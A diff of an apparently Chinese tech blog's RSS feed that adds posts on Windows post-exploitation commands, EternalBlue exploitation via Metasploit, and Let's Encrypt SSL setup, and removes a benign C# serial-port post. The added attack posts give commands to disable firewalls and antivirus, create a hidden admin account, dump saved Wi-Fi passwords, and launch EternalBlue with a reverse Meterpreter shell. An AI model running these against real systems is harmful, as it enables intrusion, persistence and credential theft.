@@ -8,6 +8,216 @@
         <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />  
           
             <item>  
+               <title>在渗透后非常有用的windows命令整理</title>  
+               <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
+  &lt;li&gt;&lt;a href=&quot;#在渗透后非常有用的windows命令整理&quot; id=&quot;markdown-toc-在渗透后非常有用的windows命令整理&quot;&gt;在渗透后非常有用的windows命令整理&lt;/a&gt;    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#注意事项&quot; id=&quot;markdown-toc-注意事项&quot;&gt;注意事项&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#命令明细&quot; id=&quot;markdown-toc-命令明细&quot;&gt;命令明细&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;hr /&gt;
+
+&lt;h1 id=&quot;在渗透后非常有用的windows命令整理&quot;&gt;在渗透后非常有用的windows命令整理&lt;/h1&gt;
+
+&lt;h2 id=&quot;注意事项&quot;&gt;注意事项&lt;/h2&gt;
+
+&lt;p&gt;以下整理的命令不一定在所有windows平台适用，如win10版本等高版本的系统会被拒绝访问，某些杀毒软件会弹出提示框显示授权操作，所以建议是拿到超级管理员权限，且将目标主机的杀毒软件卸载或者关闭。&lt;/p&gt;
+
+&lt;h2 id=&quot;命令明细&quot;&gt;命令明细&lt;/h2&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# 关闭防火墙
+netsh advfirewall set allprofiles state off
+netsh firewall set opmode disable
+
+# 添加防火墙出入站规则（关闭防火墙失败的情况）
+netsh advfirewall firewall add rule name='netcat' dir=in action=allow protocol=Tcp localport=4445
+# 检查查看防火墙配置的出入站规则
+netsh firewall show portopening
+
+# 查看进程杀死进程
+tasklist
+tskill 6486
+
+# 创建用户并添加到管理员组
+net user vinny$ 123321 /add
+net localgroup administrators vinny$ /add
+
+# 删除目标用户或者密码
+net user vinny$ *
+net user vinny$ /delete
+
+# 压缩文件夹或者文件（目标系统安装好winrar的情况）
+&quot;%ProgramFiles%\Winrar\rar&quot; a -ag -k -r -s -ibck a.rar &quot;SAP BYD资料&quot;
+&quot;%ProgramFiles%\Winrar\rar&quot; a -ag -k -r -s -ibck a.rar 1.txt 2.txt
+
+# 查看目标机器保存的无线热点和密码
+netsh wlan show profile
+netsh wlan show profile name=&quot;menote2&quot; key=clear
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+</description>  
+               <pubDate>Sun, 29 Oct 2017 00:00:00 +0800</pubDate>  
+               <link>http://localhost:4000/2017/10/windows-useful-cmds/</link>  
+               <guid isPermaLink="true">http://localhost:4000/2017/10/windows-useful-cmds/</guid>  
+               </item>  
+          
+            <item>  
+               <title>永恒之蓝(ms17-010-eternalblue)漏洞利用</title>  
+               <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
+  &lt;li&gt;&lt;a href=&quot;#永恒之蓝ms17-010-eternalblue漏洞利用&quot; id=&quot;markdown-toc-永恒之蓝ms17-010-eternalblue漏洞利用&quot;&gt;永恒之蓝(ms17-010-eternalblue)漏洞利用&lt;/a&gt;    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#适用版本&quot; id=&quot;markdown-toc-适用版本&quot;&gt;适用版本&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#目标扫描&quot; id=&quot;markdown-toc-目标扫描&quot;&gt;目标扫描&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#漏洞攻击&quot; id=&quot;markdown-toc-漏洞攻击&quot;&gt;漏洞攻击&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;hr /&gt;
+
+&lt;h1 id=&quot;永恒之蓝ms17-010-eternalblue漏洞利用&quot;&gt;永恒之蓝(ms17-010-eternalblue)漏洞利用&lt;/h1&gt;
+
+&lt;h2 id=&quot;适用版本&quot;&gt;适用版本&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Windows XP (all services pack) (x86) (x64)&lt;/li&gt;
+  &lt;li&gt;Windows Server 2003 SP0 (x86)&lt;/li&gt;
+  &lt;li&gt;Windows Server 2003 SP1/SP2 (x86)&lt;/li&gt;
+  &lt;li&gt;Windows Server 2003 (x64)&lt;/li&gt;
+  &lt;li&gt;Windows Vista (x86)&lt;/li&gt;
+  &lt;li&gt;Windows Vista (x64)&lt;/li&gt;
+  &lt;li&gt;Windows Server 2008 (x86)&lt;/li&gt;
+  &lt;li&gt;Windows Server 2008 R2 (x86) (x64)&lt;/li&gt;
+  &lt;li&gt;Windows 7 (all services pack) (x86) (x64)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;目标扫描&quot;&gt;目标扫描&lt;/h2&gt;
+
+&lt;p&gt;这里以内网扫描进行测试，所有扫描内网中所有主机，并检查其是否存在此漏洞。&lt;/p&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf &amp;gt; use auxiliary/scanner/smb/smb_ms17_010
+msf &amp;gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;RHOSTS 192.168.1.0/24
+msf &amp;gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;THREADS 100
+msf &amp;gt; exploit
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h2 id=&quot;漏洞攻击&quot;&gt;漏洞攻击&lt;/h2&gt;
+
+&lt;p&gt;确定好目标主机后，就可以使用启动监听并进行攻击&lt;/p&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf &amp;gt; use exploit/windows/smb/ms17_010_eternalblue
+msf &amp;gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;payload windows/meterpreter/reverse_tcp
+msf &amp;gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;LHOST 192.168.1.15
+msf &amp;gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;LPORT 4444
+msf &amp;gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;RHOST 192.168.1.110
+msf &amp;gt; exploit
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+</description>  
+               <pubDate>Sat, 28 Oct 2017 00:00:00 +0800</pubDate>  
+               <link>http://localhost:4000/2017/10/ms17-010-eternalblue/</link>  
+               <guid isPermaLink="true">http://localhost:4000/2017/10/ms17-010-eternalblue/</guid>  
+               </item>  
+          
+            <item>  
+               <title>使用Lets Encrypt为站点快速部署SSL证书</title>  
+               <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
+  &lt;li&gt;&lt;a href=&quot;#使用lets-encrypt为站点快速部署ssl证书&quot; id=&quot;markdown-toc-使用lets-encrypt为站点快速部署ssl证书&quot;&gt;使用Lets Encrypt为站点快速部署SSL证书&lt;/a&gt;    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#使用背景&quot; id=&quot;markdown-toc-使用背景&quot;&gt;使用背景&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#下载安装脚本&quot; id=&quot;markdown-toc-下载安装脚本&quot;&gt;下载安装脚本&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#配置相关信息&quot; id=&quot;markdown-toc-配置相关信息&quot;&gt;配置相关信息&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#执行证书生成&quot; id=&quot;markdown-toc-执行证书生成&quot;&gt;执行证书生成&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#配置证书安装&quot; id=&quot;markdown-toc-配置证书安装&quot;&gt;配置证书安装&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;hr /&gt;
+
+&lt;h1 id=&quot;使用lets-encrypt为站点快速部署ssl证书&quot;&gt;使用Lets Encrypt为站点快速部署SSL证书&lt;/h1&gt;
+
+&lt;h2 id=&quot;使用背景&quot;&gt;使用背景&lt;/h2&gt;
+
+&lt;p&gt;时常搜索”免费ssl证书”，申请和验证步骤很麻烦，审核时间也不定，”&lt;strong&gt;&lt;a href=&quot;https://letsencrypt.org/&quot;&gt;Lets Encrypt&lt;/a&gt;&lt;/strong&gt;“是一个倡导互联网上所有网站都该使用https的组织，提供免费的ssl证书服务。&lt;/p&gt;
+
+&lt;h2 id=&quot;下载安装脚本&quot;&gt;下载安装脚本&lt;/h2&gt;
+
+&lt;p&gt;下载Github上贡献者做好的安装脚本，如下：&lt;/p&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wget https://raw.githubusercontent.com/xdtianyu/scripts/master/lets-encrypt/letsencrypt.conf
+wget https://raw.githubusercontent.com/xdtianyu/scripts/master/lets-encrypt/letsencrypt.sh
+
+&lt;span class=&quot;c&quot;&gt;# 赋予执行权限&lt;/span&gt;
+chmod +x letsencrypt.sh
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h2 id=&quot;配置相关信息&quot;&gt;配置相关信息&lt;/h2&gt;
+
+&lt;p&gt;使用&lt;code class=&quot;highlighter-rouge&quot;&gt;vi letsencrypt.conf&lt;/code&gt;打开配置文件，将里面的 &lt;strong&gt;example.com&lt;/strong&gt; 换成自己的域名，如下：&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# only modify the values, key files will be generated automaticly.
+ACCOUNT_KEY=&quot;letsencrypt-account.key&quot;
+DOMAIN_KEY=&quot;tiger.com.key&quot;
+DOMAIN_DIR=&quot;/usr/local/openresty/nginx/html&quot;
+DOMAINS=&quot;DNS:test.tiger.com&quot;
+#ECC=TRUE
+#LIGHTTPD=TRUE
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;按以往免费申请ssl的经历，通常都需要验证域名的所属权，不是通过配置二级域名验证就是需要在网站根目录上传验证文件，经过试用 &lt;strong&gt;Lets Encrypt&lt;/strong&gt;，发现它使用的是第二种方式。&lt;/p&gt;
+
+&lt;p&gt;所以在使用nginx做动态代理时，需要先注释掉，使用基本的静态文件方式配置nginx的虚拟主机以便 &lt;strong&gt;Lets Encrypt&lt;/strong&gt; 去做验证，等ssl安装好之后在配置成动态代理即可。&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;所以上述配置文件中的 DOMAIN_DIR 很重要，否则会执行失败&lt;/strong&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;执行证书生成&quot;&gt;执行证书生成&lt;/h2&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./letsencrypt.sh ./letsencrypt.conf
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;没有什么错误就会生成如下的几个文件，其中&lt;strong&gt;tiger.chained.crt&lt;/strong&gt;和&lt;strong&gt;tiger.com.key&lt;/strong&gt;就是需要的文件。&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;letsencrypt-account.key
+tiger.crt
+tiger.csr
+tiger.chained.crt
+tiger.com.key
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h2 id=&quot;配置证书安装&quot;&gt;配置证书安装&lt;/h2&gt;
+
+&lt;p&gt;这里使用nginx进行证书安装的服务器&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;server {
+	listen       443;
+	server_name  test.tiger.com;
+
+    ssl on;
+    ssl_certificate tiger.chained.crt;
+    ssl_certificate_key tiger.com.key;
+    ssl_session_timeout 5m;
+
+    location / {
+        root html;
+        index  index.html index.htm;
+    }
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+</description>  
+               <pubDate>Fri, 27 Oct 2017 00:00:00 +0800</pubDate>  
+               <link>http://localhost:4000/2017/10/lets-encrypt-ssl/</link>  
+               <guid isPermaLink="true">http://localhost:4000/2017/10/lets-encrypt-ssl/</guid>  
+               </item>  
+          
+            <item>  
                <title>Pyinstaller打包python应用</title>  
                <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
   &lt;li&gt;&lt;a href=&quot;#pyinstaller打包python应用&quot; id=&quot;markdown-toc-pyinstaller打包python应用&quot;&gt;Pyinstaller打包python应用&lt;/a&gt;    &lt;ul&gt;
@@ -449,255 +659,6 @@ vi /etc/network/if-pre-up.d/iptables
                <pubDate>Sat, 15 Jul 2017 00:00:00 +0800</pubDate>  
                <link>http://localhost:4000/2017/07/no-focus-scan/</link>  
                <guid isPermaLink="true">http://localhost:4000/2017/07/no-focus-scan/</guid>  
-               </item>  
-          
-            <item>  
-               <title>C#串口获取称重设备的实现方案</title>  
-               <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
-  &lt;li&gt;&lt;a href=&quot;#c串口获取称重设备的实现方案&quot; id=&quot;markdown-toc-c串口获取称重设备的实现方案&quot;&gt;C#串口获取称重设备的实现方案&lt;/a&gt;    &lt;ul&gt;
-      &lt;li&gt;&lt;a href=&quot;#1-串口概念&quot; id=&quot;markdown-toc-1-串口概念&quot;&gt;1. 串口概念&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#2-一些提示&quot; id=&quot;markdown-toc-2-一些提示&quot;&gt;2. 一些提示&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#3-实现代码&quot; id=&quot;markdown-toc-3-实现代码&quot;&gt;3. 实现代码&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#4-测试程序&quot; id=&quot;markdown-toc-4-测试程序&quot;&gt;4. 测试程序&lt;/a&gt;&lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;hr /&gt;
-
-&lt;h1 id=&quot;c串口获取称重设备的实现方案&quot;&gt;C#串口获取称重设备的实现方案&lt;/h1&gt;
-
-&lt;h2 id=&quot;1-串口概念&quot;&gt;1. 串口概念&lt;/h2&gt;
-
-&lt;p&gt;串口即是com口，笔记本电脑没有串口，现在的台式机有串口的也很少，需要另配串口卡，一般位于机箱后面的9针公口（非VGA口）。实现串口通信的协议有多种，常用的是&lt;strong&gt;RS232&lt;/strong&gt;协议，只要输入设备存在串口就可以通过标准协议读取此设备的数据。&lt;/p&gt;
-
-&lt;p&gt;串口通信是双向的，既可以获取数据，也可以向设备发送指令数据，这个要看设备具体是否支持指令的发送。通常发送指令的目的是变更设置、获取数据（非连续输出）、开关设备等。&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;本文中的串口设备使用的称重设备，电子秤、地磅，只负责读取，不写入。&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;h2 id=&quot;2-一些提示&quot;&gt;2. 一些提示&lt;/h2&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;
-    &lt;p&gt;&lt;strong&gt;串口线&lt;/strong&gt; 购买串口线时需要看清楚设备的串口是9针的还是25针的、公口还是母口。串口线是否支持热插拨，&lt;strong&gt;不支持热插拨的串口线，需要关闭电源再进行插入和拔出，否则串口线会损坏&lt;/strong&gt;。&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;&lt;strong&gt;参数调整&lt;/strong&gt; 需要接入的串口设备通常情况下都是出厂设置，需要手动配置或查看此设备的波特率、校验位、数据位、传输方式等信息，说明书或仪表盘上可以得到。&lt;/p&gt;
-  &lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;波特率使用设备缺省的即可，若将设备的校验位设置为空，则数据位随意。传输方式需要设置为连续输出，连续输出的意思是当COM口打开时设备不停的向串口发送数据，除了连续输出还有指令输出，即只有发送指令设备才向COM口发送数据。&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;h2 id=&quot;3-实现代码&quot;&gt;3. 实现代码&lt;/h2&gt;
-
-&lt;p&gt;使用&lt;strong&gt;C#&lt;/strong&gt;操作串口使用&lt;code class=&quot;highlighter-rouge&quot;&gt;SerialPort&lt;/code&gt;类，实现的步骤为设置串口参数、打开串口监听、获取数据事件、关闭串口，主要代码如下：&lt;/p&gt;
-
-&lt;div class=&quot;language-c# highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// -------------------- 定义串口对象及委托事件 --------------------
-&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SerialPort&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Com_SerialPort&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;SerialPort&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;delegate&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;UpdateTextEventHandler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;UpdateTextEventHandler&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;updateText&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-
-&lt;span class=&quot;k&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;SerialForm_Load&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;object&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sender&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;EventArgs&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-	&lt;span class=&quot;c1&quot;&gt;// 注册委托事件，核心
-&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;updateText&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;UpdateTextEventHandler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;UpdateTextBox&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-
-&lt;span class=&quot;k&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;button1_Click&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;object&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sender&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;EventArgs&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-	&lt;span class=&quot;n&quot;&gt;Com_SerialPort&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PortName&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;COM1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;	&lt;span class=&quot;c1&quot;&gt;// 使用哪个串口
-&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;Com_SerialPort&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BaudRate&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;9600&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;	&lt;span class=&quot;c1&quot;&gt;// 波特率
-&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;Com_SerialPort&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DataBits&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;		&lt;span class=&quot;c1&quot;&gt;// 数据位
-&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;Com_SerialPort&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Parity&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Parity&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;	&lt;span class=&quot;c1&quot;&gt;// 校验位
-&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;Com_SerialPort&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;StopBits&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;StopBits&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;// 停止位
-&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;Com_SerialPort&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
-	&lt;span class=&quot;n&quot;&gt;Com_SerialPort&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ReceivedBytesThreshold&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-	&lt;span class=&quot;n&quot;&gt;Com_SerialPort&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DataReceived&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;SerialDataReceivedEventHandler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Com_SerialPort_DataReceive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-
-&lt;span class=&quot;k&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;Com_SerialPort_DataReceive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;object&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sender&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SerialDataReceivedEventArgs&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-	&lt;span class=&quot;n&quot;&gt;Thread&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 时间短可能导致数据读取不完整
-&lt;/span&gt;	&lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Com_SerialPort&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;ReadExisting&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
-	&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Invoke&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;updateText&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-
-&lt;span class=&quot;c1&quot;&gt;// 核心方法，当打开串口时，串口设备会不停调用此方法
-&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;UpdateTextBox&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-	&lt;span class=&quot;c1&quot;&gt;// 这里的text就是设备输入的数据
-&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;label1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;每个设备输入的协议会有所不同，即UpdateTextBox方法中的text变量不同，如”30 726 00”，30代表称重设备的稳定状态，38代表不稳定，726代表称重重量，即72.6kg，所以text需要根据设备具体的输出区别对待。&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;h2 id=&quot;4-测试程序&quot;&gt;4. 测试程序&lt;/h2&gt;
-
-&lt;p&gt;下面的程序是当时为了便于调测串口称重设备时做的，包含基本的称重数据读取及原始数据的输出，不支持发送指令。&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;http://ohdpyqlwy.bkt.clouddn.com/12-15-54.png&quot; alt=&quot;称重程序截图&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;链接: &lt;a href=&quot;http://pan.baidu.com/s/1o8oLe7w&quot;&gt;http://pan.baidu.com/s/1o8oLe7w&lt;/a&gt;  密码: &lt;strong&gt;tdei&lt;/strong&gt;&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;&lt;strong&gt;SerialDemo.zip&lt;/strong&gt;源码保存在个人百度网盘的&lt;strong&gt;博客保存的源码&lt;/strong&gt;目录中（给自己看的）&lt;/p&gt;
-&lt;/blockquote&gt;
-
-</description>  
-               <pubDate>Fri, 14 Jul 2017 00:00:00 +0800</pubDate>  
-               <link>http://localhost:4000/2017/07/serial-port-weight/</link>  
-               <guid isPermaLink="true">http://localhost:4000/2017/07/serial-port-weight/</guid>  
-               </item>  
-          
-            <item>  
-               <title>Gitlab私有仓库的备份和还原</title>  
